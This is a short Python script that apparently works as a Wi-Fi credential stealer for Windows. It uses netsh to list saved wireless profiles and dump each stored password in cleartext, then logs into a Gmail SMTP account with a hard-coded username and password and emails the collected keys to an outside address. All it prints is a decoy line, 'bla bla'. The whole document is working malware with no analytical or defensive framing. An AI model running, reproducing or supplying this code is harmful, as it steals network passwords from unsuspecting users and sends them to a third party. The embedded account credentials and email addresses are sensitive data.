import subprocess 
import re
import smtplib
from email.message import EmailMessage

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
message = ''
if len(profile_names) != 0:
    for name in profile_names:
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            message += name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                message += ' : None'
            else:
                message += ' : '+ password[1]
            message += ' , '
server=smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('wificrack123@gmail.com', 'WIFIcrack123')
email = EmailMessage()
email['From'] = 'wificrack123@gmail.com'
email['To'] = 'm.maduranga433@gmail.com'
email['Subject'] = 'wifi keys'
email.set_content(message)
server.send_message(email)
print('bla bla')